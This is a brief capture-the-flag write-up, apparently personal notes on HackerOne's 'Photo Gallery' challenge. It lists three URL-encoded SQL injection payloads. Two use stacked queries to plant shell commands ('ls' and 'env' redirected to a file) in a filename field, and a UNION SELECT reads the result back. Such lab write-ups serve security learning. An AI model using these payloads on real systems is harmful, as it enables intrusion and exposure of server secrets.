# Photo Gallery
- [ ] Flag1, Flag2, Flag3
- All three flags were located in the same location, however I found Flag2 first technically by using SQLmap
- I found all three by using SQL injection to rename different files within the database, and then specifically call them in `requirements.txt`
- The SQL injection attacks I used were
	- `/fetch?id=1;%20update%20photos%20set%20filename=%27*%20||%20ls%20./files%20%3Etemp.txt%20%27%20where%20id=3;%20commit;%20--`
	- `/fetch?id=1;%20update%20photos%20set%20filename=%27*%20||%20env%20%3Etemp.txt%27%20where%20id=3;%20commit;%20--`
	- `/fetch?id=4 UNION SELECT 'temp.txt'--`

![[SQLI.png]]

![[SQLI2.png]]

![[SQLI3.png]]




%%
Tags
#HackerOne
#CTF 
#HackReport
%%